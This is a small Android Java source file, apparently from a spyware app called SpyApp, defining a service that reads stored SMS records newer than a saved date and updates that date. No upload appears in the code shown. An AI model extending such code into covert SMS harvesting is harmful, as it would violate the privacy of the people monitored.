package com.app.spyapp.servercall;

import android.app.IntentService;
import android.content.Intent;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Pref;
import com.app.spyapp.model.SMSModel;

import java.util.ArrayList;

/**
 * Created by Ankit on 5/26/2016.
 */
public class SMSCallService extends IntentService {

    private SpyApp spyApp;

    public SMSCallService() {
        super(SMSCallService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        ArrayList<SMSModel> smsList = spyApp.getDatabaseHelper().getSMSList(spyApp.getSharedPreferences().getString(Pref.SMS_LAST_UPDATEDATE, Const.INITDATETIME));
        spyApp.getSharedPreferences().edit().putString(Pref.SMS_LAST_UPDATEDATE, spyApp.getDatabaseHelper().getMaxDateofSMS()).apply();

    }
}
